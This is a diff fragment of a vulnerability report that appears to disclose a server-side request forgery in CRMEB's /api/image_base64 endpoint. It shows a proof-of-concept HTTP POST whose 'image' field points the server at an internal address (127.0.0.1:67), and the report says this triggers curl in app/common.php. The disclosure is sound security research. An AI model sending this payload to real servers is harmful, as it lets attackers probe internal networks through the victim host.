@@ -35,34 +35,19 @@ Even if here on the incoming imageurl/codeurl judgement, but here there is a log
 POC:
 ```
 POST /api/image_base64 HTTP/1.1
-
-Host: crmeb.cc
-
-Origin: http://crmeb.cc
-
+Host: 127.0.0.21
 Cookie: cb_lang=zh-cn; PHPSESSID=c3db7bedde04b37c0bc6a5699dbde774
-
 Upgrade-Insecure-Requests: 1
-
 Content-Type: application/json
-
 Referer: http://crmeb.cc//api/image_base64
-
 Accept-Language: zh-CN,zh;q=0.9
-
 Accept-Encoding: gzip, deflate
-
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
-
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-
 Cache-Control: max-age=0
-
 Content-Length: 53
 
-  
-
-{"image":"http://127.0.0.1:67?1=12221231","code":""}
+{"image":"http://127.0.0.1:67?1=1222ss1231","code":""}
 ```
 Trigger curl here(app/common.php)
 ![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407121444887.png)
